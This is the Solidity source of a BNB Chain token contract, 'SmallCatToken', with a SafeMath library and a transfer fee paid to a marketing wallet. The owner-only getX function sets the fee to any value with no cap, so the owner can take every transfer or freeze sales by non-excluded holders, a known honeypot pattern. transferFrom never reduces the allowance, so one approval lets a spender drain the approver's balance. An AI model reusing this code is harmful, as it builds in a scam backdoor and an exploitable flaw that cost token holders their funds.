/**
 *Submitted for verification at BscScan.com on 2022-04-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract SmallCatToken {
 
 using SafeMath for uint256;
    string public name = "SmallCatToken";
    string  public symbol = "SCT";
    uint8   public decimals = 9;
 uint256 public totalSupply_ = 1000000000000* (10 ** decimals);
 
 address public LiquityWallet;
 uint256 public  marketingFee = 2;
 address private _marketingWalletAddress;
 
    
 constructor(address _market) {
        balances[msg.sender] = totalSupply_;
  LiquityWallet=msg.sender;
  _marketingWalletAddress=_market;
  excludeFromFees(LiquityWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(_marketingWalletAddress, true);
    }
 
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;
 mapping(address => bool) private _isExcludedFromFees;
    

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value); 
  
  if(!_isExcludedFromFees[msg.sender]){
   uint256 marketFee=_value.mul(marketingFee).div(100);
   uint256 trueAmount = _value.sub(marketFee);
   balances[msg.sender] -= _value;
   balances[_marketingWalletAddress]+=marketFee;
   balances[_to] += trueAmount;
   emit Transfer(msg.sender, _marketingWalletAddress, marketFee);
   emit Transfer(msg.sender, _to, trueAmount);
   
         }else{
   balances[msg.sender] -= _value;
   balances[_to] +=  _value;
            emit Transfer(msg.sender, _to, _value);
         }
   return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
  
  if(!_isExcludedFromFees[_from]){
   uint256 marketFee=_value.mul(marketingFee).div(100);
   uint256 trueAmount = _value.sub(marketFee);
   balances[_from] -= _value;
   balances[_marketingWalletAddress]+=marketFee;
   balances[_to] +=  trueAmount;
   emit Transfer(_from, _marketingWalletAddress, marketFee);
   emit Transfer(_from, _to, trueAmount);
        }else{
   balances[_from] -= _value;
   balances[_to] +=  _value;
            emit Transfer(_from, _to, _value);
        }
        return true;
    }
 
 function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value; 
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
 
 function getX(uint256 X) public {
  require(msg.sender==LiquityWallet);
  marketingFee=X;
 }
 
    function excludeFromFees(address account, bool excluded) public{ 
        require(_isExcludedFromFees[account] != excluded, "RedCheCoin Account is already the value of 'excluded'");
  require(msg.sender==LiquityWallet);
  
        _isExcludedFromFees[account] = excluded;
    }
 
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }
 
}